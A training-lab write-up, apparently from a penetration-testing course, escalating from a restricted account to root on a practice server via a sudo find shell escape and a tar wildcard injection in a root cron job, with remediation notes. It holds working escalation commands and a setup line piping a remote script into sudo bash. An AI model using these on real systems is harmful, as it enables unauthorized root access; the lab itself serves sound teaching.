# 🪜 Session 23 — Climbing the Ladder
### Vertical Privilege Escalation | Week 8

![Linux](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white&color=39e08b)
![Technique](https://img.shields.io/badge/Technique-Privilege%20Escalation-critical?style=flat&color=ff5e5e)
![Tool](https://img.shields.io/badge/Tool-LinPEAS-yellow?style=flat&color=f5a623)
![Status](https://img.shields.io/badge/Status-Complete-success?style=flat&color=39e08b)

> **Engineer:** Mohammed Adamu
> **Scenario:** Breached a TitanCorp development server as `limited_user` — a restricted account with almost no permissions. Mission: escalate to `root` using two independent attack chains.

---

## 📋 Table of Contents

- [Phase 0 — Environment Setup](#phase-0--environment-setup)
- [Phase 1 — Sudo Abuse](#phase-1--sudo-abuse)
- [Phase 2 — Automated Enumeration](#phase-2--automated-enumeration)
- [Phase 3 — Cron Job Wildcard Injection](#phase-3--cron-job-wildcard-injection)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## Phase 0 — Environment Setup

Before starting, the provisioning script was run inside the Ubuntu VM to create the vulnerable user account, download enumeration tools, and seed the artifact template.

```bash
curl -sL https://gist.githubusercontent.com/grobbins-cell/e19d720f62ba447b9e520e63dc734abd/raw/s23_provision.sh | sudo bash
```

> ✅ Confirmed: `[+] PROVISIONING COMPLETE` before proceeding.

---

## Phase 1 — Sudo Abuse

**Vulnerability:** Overly permissive `sudoers` entry allowing `limited_user` to run `/usr/bin/find` as root with no password.

### Steps

**1. Switch into the restricted account**
```bash
su - limited_user
# Password: titan123
```

**2. Enumerate sudo permissions**
```bash
sudo -l
```
```
(root) NOPASSWD: /usr/bin/find
```

**3. Exploit `find`'s `-exec` flag to spawn a root shell**
```bash
sudo find . -exec /bin/sh -p \; -quit
```

**4. Verify escalation**
```bash
whoami
# root
```

> 💡 **Why it works:** `find`'s `-exec` flag runs arbitrary commands. When the binary runs as root via sudo, any spawned subprocess inherits root privileges. Documented on [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

---

## Phase 2 — Automated Enumeration

**Tool:** LinPEAS — automated Linux privilege escalation enumeration script.

### Steps

**1. Run the enumeration script**
```bash
cd ~/Linux_PrivEsc/
./linpeas.sh
```

**2. Key finding — root-owned cron job**

In the **Cron Jobs** section (highlighted RED/YELLOW), LinPEAS revealed:

```
* * * * *  root  /usr/local/bin/backup.sh
```

Contents of `backup.sh`:
```bash
tar -cf /tmp/backup.tar *
```

> ⚠️ **Vulnerability:** The unquoted `*` wildcard expands filenames in `/home/limited_user/backups/` — a directory we control. Filenames beginning with `--` are parsed by `tar` as command-line flags.

---

## Phase 3 — Cron Job Wildcard Injection

**Vulnerability:** Root-owned cron job running `tar *` in a user-writable directory every 60 seconds.

### Steps

**1. Enter the target directory**
```bash
cd /home/limited_user/backups
```

**2. Create the malicious payload script**
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
```
This script — when executed as root — copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit, creating a persistent root shell.

**3. Plant "flag" files that poison the wildcard**
```bash
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh runme.sh"
```
When `tar *` expands, these filenames are parsed as CLI flags — triggering execution of `runme.sh` under the root context.

**4. Wait ~60 seconds for the cron job to fire**
```bash
ls -l /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
```

**5. Execute the SUID shell**
```bash
/tmp/rootbash -p
```

**6. Confirm root access**
```bash
id
# uid=1001(limited_user) gid=1001(limited_user) euid=0(root) groups=1001(limited_user)
```

> ✅ **Root achieved.** The SUID binary runs with effective UID of 0 regardless of who invokes it. The `-p` flag preserves that elevated privilege in the spawned shell.

---

## Key Takeaways

| Technique | Root Cause | Remediation |
|---|---|---|
| `sudo find` abuse | Overly permissive sudoers entry grants root execution of a GTFOBins binary | Remove `find` from sudoers; apply least-privilege principle |
| Cron wildcard injection | Unquoted `tar *` in a user-writable directory run by root cron | Use absolute paths: `tar -cf /tmp/backup.tar /home/limited_user/backups/` |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `sudo -l` | Enumerate allowed sudo commands for the current user |
| `LinPEAS` | Automated Linux privilege escalation enumeration |
| `GTFOBins` | Reference for abusing legitimate Unix binaries |
| `tar` wildcard injection | Cron job exploitation via flag filename spoofing |

---

<div align="center">

*Session 23 — TitanCorp Penetration Testing Lab*

</div>
